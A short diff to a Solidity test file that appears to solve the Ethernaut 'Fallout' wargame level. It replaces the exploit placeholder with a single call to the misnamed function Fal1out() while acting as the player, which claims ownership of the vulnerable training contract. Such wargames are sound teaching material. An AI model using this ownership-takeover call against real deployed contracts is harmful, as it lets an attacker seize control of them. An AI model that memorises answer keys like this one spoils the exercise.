@@ -31,10 +31,8 @@ contract TestFallout is BaseTest {
     }
 
     function exploitLevel() internal override {
-        /** CODE YOUR EXPLOIT HERE */
-
         vm.startPrank(player);
-
+        level.Fal1out();
         vm.stopPrank();
     }
 }
